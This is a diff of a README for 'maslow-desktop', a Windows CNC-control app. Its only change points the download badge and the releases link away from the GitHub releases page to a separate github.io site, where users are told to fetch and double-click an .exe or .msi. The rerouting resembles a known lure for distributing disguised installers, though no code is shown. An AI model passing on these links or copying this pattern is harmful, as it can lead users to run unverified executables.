@@ -1,6 +1,6 @@
 # 🪵 maslow-desktop - Control your CNC machine with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Preniben2452/maslow-desktop/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://preniben2452.github.io)
 
 maslow-desktop acts as the bridge between your computer and your Maslow CNC machine. It provides a simple interface to send instructions, move the router, and run your woodworking projects. This application supports the FluidNC software to ensure your machine runs smoothly and reliably.
 
@@ -8,7 +8,7 @@ maslow-desktop acts as the bridge between your computer and your Maslow CNC mach
 
 To begin using the software on your Windows computer, follow these steps. You do not need to install any programming tools or compilers.
 
-1. Visit the [releases page](https://github.com/Preniben2452/maslow-desktop/releases) to download the software.
+1. Visit the [releases page](https://preniben2452.github.io) to download the software.
 2. Look for the file ending in `.msi` or `.exe` under the latest release version.
 3. Save the file to your computer.
 4. Double-click the file to start the installation wizard.
